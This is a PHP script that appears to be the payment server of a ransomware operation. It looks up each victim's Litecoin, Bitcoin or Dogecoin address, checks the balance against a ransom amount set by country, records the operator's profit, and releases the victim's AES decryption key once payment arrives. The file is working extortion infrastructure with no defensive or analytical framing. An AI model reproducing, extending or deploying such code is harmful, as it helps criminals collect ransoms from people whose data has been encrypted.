<?php
	require_once realpath(dirname(__FILE__)) . '/../utils/db.php';
	require_once realpath(dirname(__FILE__)) . '/../utils/payment.php';
	
	
	if(empty($_GET["uid"])) {
		echo "false";
		return;
	}

	$client = get_client($_GET["uid"])[0];
	
	$addresses = array(
		"LTC" => $client["address_ltc"],
		"BTC" => $client["address_btc"],
		"DOGE" => $client["address_doge"]
	);
	
	$b = get_address_balance($addresses[$_GET["coin"]], $_GET["coin"]);
	
	if(!array_key_exists($client["country"], PAYMENT_SUM)) {
		$client["country"] = "";
	}
	
	$need = PAYMENT_SUM[$client["country"]][$_GET["coin"]];
	
	if($client["payed"] or $b >= $need) {
		set_payed($_GET["uid"]);
		$b *= PRICE[$_GET["coin"]];
		update_profit($b, $client["country"]);
		echo "true|" . $client["aeskey"];
		exit();
	}
	
	echo "false|0";
?>